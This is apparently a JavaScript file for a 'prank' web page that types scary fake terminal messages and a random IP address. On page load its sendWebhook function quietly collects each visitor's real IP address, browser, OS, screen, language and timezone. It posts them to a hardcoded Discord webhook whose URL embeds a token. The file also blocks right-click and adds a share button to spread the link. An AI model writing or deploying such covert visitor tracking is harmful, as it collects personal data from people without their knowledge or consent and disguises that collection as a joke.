// Terminal-style prank script
// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';

// Function to send webhook
async function sendWebhook() {
    if (WEBHOOK_URL) {
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(() => 'Unknown IP');
            
        // Get device information
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const colorDepth = `${window.screen.colorDepth} bit`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const timestamp = new Date().toISOString();
        
        // Parse user agent for more details
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
        const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
        
        const embed = {
            title: '🌐 Website Visitor',
            description: 'Someone opened the Your Website!',
            color: 0x00ff00,
            fields: [
                { name: '🌐 IP Address', value: ip, inline: true },
                { name: '🕒 Timestamp', value: timestamp, inline: true },
                { name: '🌍 Timezone', value: timezone, inline: true },
                { name: '💻 Platform', value: platform, inline: true },
                { name: '📱 Device Type', value: isMobile ? 'Mobile' : 'Desktop', inline: true },
                { name: '🔍 Screen', value: `${screenRes} (${colorDepth})`, inline: true },
                { name: '🌐 Browser', value: browser, inline: true },
                { name: '🖥️ OS', value: os, inline: true },
                { name: '🌐 Language', value: language, inline: true }
            ]
        };
        
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [embed],
                content: '🚀 Someone Has Opened The Website!'
            })
        }).catch(console.error);
    }
}

// Send webhook when page loads
sendWebhook();

document.addEventListener('DOMContentLoaded', () => {
    // Get DOM elements
    const terminal = document.getElementById('terminal');
    const ipLine = document.getElementById('ip-line');
    const cookiesLine = document.getElementById('cookies-line');
    const accountLine = document.getElementById('account-line');
    const jokeLine = document.getElementById('joke-line');
    const revealLine = document.getElementById('reveal-line');
    
    // Typewriter effect
    function typeWriter(element, text, speed = 10, callback) {
        let i = 0;
        element.innerHTML = '';
        
        function type() {
            if (i < text.length) {
                element.innerHTML += text.charAt(i);
                i++;
                setTimeout(type, speed);
            } else if (callback) callback();
        }
        type();
    }
    
    // Get a random IP address
    function getRandomIp() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
    
    // Fixed location
    const location = 'England, UK';
    
    // Start the sequence
    setTimeout(() => {
        // Show IP address with fixed location
        typeWriter(ipLine, `> IP Address: ${getRandomIp()} (${location})`, 10, () => {
            // Show data collection message
            setTimeout(() => {
                typeWriter(cookiesLine, '> Scanning device for personal data...', 10, () => {
                    // Show fake data found
                    setTimeout(() => {
                        typeWriter(accountLine, '> Data collection complete!', 10, () => {
                            // Show joke message
                            setTimeout(() => {
                                typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
                                    // Final reveal
                                    setTimeout(() => {
                                        typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
                                            // Add a share button
                                            const button = document.createElement('button');
                                            button.className = 'button';
                                            button.textContent = 'Share this prank';
                                            button.onclick = () => {
                                                if (navigator.share) {
                                                    navigator.share({
                                                        title: 'Check this out!',
                                                        text: 'I found something interesting!',
                                                        url: window.location.href
                                                    });
                                                } else {
                                                    alert('Share this link: ' + window.location.href);
                                                }
                                            };
                                            terminal.appendChild(button);
                                        });
                                    }, 1000);
                                });
                            }, 1000);
                        });
                    }, 1000);
                });
            }, 1000);
        });
    }, 500);
    
    // Prevent context menu on right-click
    document.addEventListener('contextmenu', (e) => e.preventDefault());
});
